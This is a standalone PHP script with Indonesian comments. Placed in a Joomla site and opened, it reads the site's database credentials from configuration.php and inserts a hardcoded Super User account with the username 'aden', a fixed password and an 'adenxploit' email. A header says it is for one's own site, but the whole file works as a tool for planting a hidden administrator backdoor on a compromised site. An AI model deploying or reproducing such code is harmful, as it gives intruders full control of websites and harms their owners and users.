<?php
/**
 * Joomla Add Administrator — Hanya untuk situs yang kamu miliki
 * Jalankan 1x, lalu HAPUS file ini segera
 */

// KONFIGURASI — UBAH SESUAI KEBUTUHAN
$new_username = 'aden';
$new_password = 'Anaksetan123#';
$new_email = 'adenxploit@gmail.com';
$display_name = 'Admin Baru';

echo "<h2>Joomla — Tambah Administrator</h2>";
echo "<hr>";

// Deteksi path konfigurasi Joomla
$possible_paths = [
    __DIR__ . '/configuration.php',
    __DIR__ . '/../configuration.php',
    __DIR__ . '/../../configuration.php'
];

$config_file = '';
foreach ($possible_paths as $p) {
    if (file_exists($p)) {
        $config_file = $p;
        break;
    }
}

if (!$config_file) {
    echo "<p style='color:red;'> Tidak ditemukan file configuration.php</p>";
    echo "<p>Pastikan file ini ditaruh di folder Joomla atau subfoldernya.</p>";
    exit;
}

require_once $config_file;

if (!class_exists('JConfig')) {
    echo "<p style='color:red;'>Format konfigurasi tidak dikenali</p>";
    exit;
}

$config = new JConfig();

// Koneksi Database
$db_host = $config->host;
$db_name = $config->db;
$db_user = $config->user;
$db_pass = $config->password;
$prefix = $config->dbprefix;

try {
    $db = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Cek apakah username sudah ada
    $stmt = $db->prepare("SELECT id FROM {$prefix}users WHERE username = ?");
    $stmt->execute([$new_username]);
    if ($stmt->rowCount() > 0) {
        echo "<p style='color:orange;'> Username <strong>$new_username</strong> sudah ada.</p>";
        exit;
    }

    // Hash password Joomla (gunakan algoritma yang sesuai)
    $salt = substr(md5(uniqid(rand(), true)), 0, 32);
    $hash = md5($new_password . $salt) . ':' . $salt;

    // user baru by aden
    $stmt = $db->prepare("INSERT INTO {$prefix}users 
        (name, username, email, password, block, sendEmail, registerDate, activation, params, lastResetTime)
        VALUES (?, ?, ?, ?, 0, 0, NOW(), '', '', '0000-00-00 00:00:00')");
    $stmt->execute([$display_name, $new_username, $new_email, $hash]);
    
    $user_id = $db->lastInsertId();

    
    $stmt = $db->prepare("SELECT id FROM {$prefix}usergroups WHERE title = 'Super Users'");
    $stmt->execute();
    $group = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if (!$group) {
        echo "<p style='color:red;'> Grup Super Users tidak ditemukan</p>";
        exit;
    }
    $group_id = $group['id'];

    // Masukkan user ke grup
    $stmt = $db->prepare("INSERT INTO {$prefix}user_usergroup_map (user_id, group_id) VALUES (?, ?)");
    $stmt->execute([$user_id, $group_id]);

    echo "<p style='color:green;font-weight:bold;'>BERHASIL!</p>";
    echo "<table border='1' cellpadding='8' style='border-collapse:collapse;'>";
    echo "<tr><td>Username</td><td><strong>$new_username</strong></td></tr>";
    echo "<tr><td>Password</td><td><strong>$new_password</strong></td></tr>";
    echo "<tr><td>Email</td><td>$new_email</td></tr>";
    echo "<tr><td>Level</td><td>Super User / Administrator Penuh</td></tr>";
    echo "</table>";
    echo "<p style='color:red;margin-top:20px;'> <strong>PENTING:</strong> Segera hapus file add_admin.php setelah selesai!</p>";

} catch (PDOException $e) {
    echo "<p style='color:red;'> Error: " . htmlspecialchars($e->getMessage()) . "</p>";
}
?>
